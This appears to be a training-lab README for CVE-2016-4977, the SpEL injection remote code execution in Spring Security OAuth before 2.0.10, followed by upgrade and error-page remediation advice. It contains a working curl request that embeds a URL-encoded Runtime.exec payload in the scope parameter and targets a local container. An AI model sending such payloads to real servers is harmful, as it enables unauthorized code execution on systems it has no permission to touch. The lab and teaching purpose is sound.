# Spring Security OAuth2 SpEL Injection Remote Code Execution (CVE-2016-4977)

## Overview

Spring Security OAuth versions prior to 2.0.10 contain a SpEL injection flaw in the Whitelabel error view. When processing OAuth2 authorization requests with an invalid scope parameter or redirect_uri, the error template evaluates user-supplied strings inside ${...} template placeholders as SpEL expressions, permitting code execution.

- **Service Access**: `http://localhost:8170/`
- **Default Credentials**: `Unauthenticated OAuth2 client`
- **Docker Shortcut**: `./lab start spring-oauth2-rce`
- **Container Name**: `cyberlab_industry_spring_oauth2_rce`
- **RAM Footprint**: ~300M

---

## Exploitation Walkthrough

### 1. Query OAuth2 Authorization Endpoint

```bash
curl -i 'http://localhost:8170/oauth/authorize?response_type=token&client_id=moped&redirect_uri=http://example.com'
```

### 2. Submit SpEL Payload in Scope Parameter

```bash
curl -i 'http://localhost:8170/oauth/authorize?response_type=token&client_id=moped&redirect_uri=http://example.com&scope=%24%7BT%28java.lang.Runtime%29.getRuntime%28%29.exec%28%22touch%20%2Ftmp%2Fpwned_oauth%22%29%7D'
```

### 3. Verify File Creation

```bash
docker exec -it cyberlab_industry_spring_oauth2_rce ls -la /tmp/pwned_oauth
```

---

## Defensive Remediation & Hardening

1. Upgrade Spring Security OAuth to version 2.0.10, 2.1.0 or newer.
2. Replace default Whitelabel error view with a static custom error page.

---

## Video Walkthroughs & Technical References

- [#spring cloud gateway remote code execution | CVE-2022-22947](https://www.youtube.com/watch?v=mX3MtC6psJA)
- [Pivotal Security Advisory CVE-2016-4977](https://pivotal.io/security/cve-2016-4977)
- [Vulhub Spring OAuth2 Environment](https://vulhub.org/#/environments/spring/CVE-2016-4977/)
